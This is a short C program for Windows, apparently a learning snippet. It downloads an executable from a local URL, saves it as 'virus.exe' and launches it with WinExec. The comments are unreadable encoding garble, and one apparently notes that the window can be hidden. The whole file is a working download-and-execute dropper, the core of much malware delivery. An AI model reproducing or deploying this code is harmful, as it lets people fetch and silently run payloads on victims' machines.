#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include "urlmon.h"
#pragma comment (lib, "urlmon")
/*
	ʹ��UrlDownloadToFile�������Urlmon.hͷ��Urlmon.lib������ļ�
*/
void main() {
	char szUrl[MAX_PATH] = "http://localhost:8080/Everything.exe";
	char szVirusPath[MAX_PATH] = "D:\\virus.exe";
	
	// �ú����Ĳ���A��WĬ����W,Ҫע��,����ͻ᷵��0x800c000d(δ֪Э��)
	HRESULT result = URLDownloadToFileA(NULL, szUrl, szVirusPath, 0, NULL);

	if (S_OK == result){
		printf("Success DownLoad\n");
	}
	else{
		printf("UnSuccess\n");
	}


	// ���غ�Ŀ�����֮����øú�������ִ��,һ����Դ���SW_HIDE�������д�������
	WinExec(szVirusPath, SW_SHOW);
	system("pause");
}